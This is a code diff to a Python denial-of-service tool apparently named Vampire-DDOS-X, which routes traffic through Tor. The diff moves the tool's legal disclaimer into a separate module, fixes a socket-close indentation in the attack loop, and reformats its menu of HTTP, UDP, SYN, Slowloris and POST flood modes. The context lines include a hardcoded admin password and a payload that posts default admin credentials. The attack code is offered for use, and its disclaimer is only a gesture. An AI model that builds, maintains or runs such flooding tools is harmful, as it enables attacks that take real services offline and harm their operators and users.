@@ -21,7 +21,11 @@ install("socks", "pysocks")
 from colorama import Fore, Style, init
 import socks
 
+# Initialize colorama
 init(autoreset=True)
+
+# Import disclaimer
+import disclaimer
 
 # Admin Passwords
 ADMIN_PASSWORD = "SH404"
@@ -58,35 +62,6 @@ user_banner = f"""
 ║      Created by: Muhammad Shourov           ║
 ╚══════════════════════════════════════════════╝
 """
-
-def show_disclaimer():
-    disclaimer = f"""
-{Fore.LIGHTRED_EX}{Style.BRIGHT}
-╔════════════════════════════════════════════════════════╗
-║ {Fore.RED}██╗     ███████╗ █████╗  ██████╗ ██╗     ███████╗  {Fore.LIGHTRED_EX}║
-║ {Fore.RED}██║     ██╔════╝██╔══██╗██╔════╝ ██║     ██╔════╝  {Fore.LIGHTRED_EX}║
-║ {Fore.RED}██║     █████╗  ███████║██║  ███╗██║     █████╗    {Fore.LIGHTRED_EX}║
-║ {Fore.RED}██║     ██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝    {Fore.LIGHTRED_EX}║
-║ {Fore.RED}███████╗███████╗██║  ██║╚██████╔╝███████╗███████╗  {Fore.LIGHTRED_EX}║
-║ {Fore.RED}╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝  {Fore.LIGHTRED_EX}║
-╠════════════════════════════════════════════════════════╣
-║ {Fore.YELLOW}WARNING! This tool is a DIGITAL WEAPON.             {Fore.LIGHTRED_EX}║
-║ {Fore.YELLOW}Unauthorized use can cause SERIOUS LEGAL ISSUES!   {Fore.LIGHTRED_EX}║
-║                                                    {Fore.LIGHTRED_EX}║
-║ {Fore.LIGHTYELLOW_EX}This tool is only for:                             {Fore.LIGHTRED_EX}║
-║   → Cybersecurity Experts                           {Fore.LIGHTRED_EX}║
-║   → Ethical Hackers (with permission)               {Fore.LIGHTRED_EX}║
-║   → Legal Penetration Testers                       {Fore.LIGHTRED_EX}║
-║                                                    {Fore.LIGHTRED_EX}║
-║ {Fore.RED}If you misuse this tool, you are FULLY RESPONSIBLE.{Fore.LIGHTRED_EX}║
-║ {Fore.RED}We, the Vampire Squad and Coder : Muhammad Shourov take NO LIABILITY.          {Fore.LIGHTRED_EX}║
-║                                                    {Fore.LIGHTRED_EX}║
-║ {Fore.LIGHTWHITE_EX}Proceed ONLY if you're 100% authorized.            {Fore.LIGHTRED_EX}║
-║ Press Ctrl+C now if you're unsure...               {Fore.LIGHTRED_EX}║
-╚════════════════════════════════════════════════════════╝
-{Style.RESET_ALL}
-"""
-    print(disclaimer)
 
 def install_tor():
     try:
@@ -134,7 +109,7 @@ def attack(target, port, attack_type):
                         payload = "username=admin&password=admin"
                         headers = f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{payload}"
                         s.send(headers.encode())
-                s.close()
+                    s.close()
                 requests_sent += 1
             except:
                 continue
@@ -149,7 +124,9 @@ def show_stats():
 def main():
     print(f"{Fore.CYAN}[?] Enter Mode (admin/user): {Style.RESET_ALL}", end='')
     mode = input().strip().lower()
-    show_disclaimer()
+
+    # Show disclaimer first
+    disclaimer.print_disclaimer()
 
     if mode == "admin":
         pw = getpass.getpass("Enter Admin Password: ")
@@ -178,11 +155,12 @@ def main():
 
     print("""
 [?] Select Attack Type:
-1. HTTP Flood
-2. UDP Flood
-3. SYN Flood
-4. Slowloris
-5. POST Flood
+
+1.  HTTP Flood
+2.  UDP Flood
+3.  SYN Flood
+4.  Slowloris
+5.  POST Flood
 """)
     attack_type = input("[+] Choice: ").strip()
     if attack_type not in ["1", "2", "3", "4", "5"]:
@@ -207,7 +185,7 @@ def main():
         print(f"\n{Fore.RED}[!] Attack stopped by user.{Style.RESET_ALL}")
         print(f"{Fore.MAGENTA}[#] Total Requests Sent: {requests_sent}{Style.RESET_ALL}")
         os.system("pkill tor")
-        print(f"{Fore.RED}[X] Shutting down Vampire-DDOS-X...We are Legend Warrior, We can do Anything! Stay With_Us!{Style.RESET_ALL}")
+        print(f"{Fore.RED}[X] Shutting down Vampire-DDOS-X... Stay lethal!{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     main()
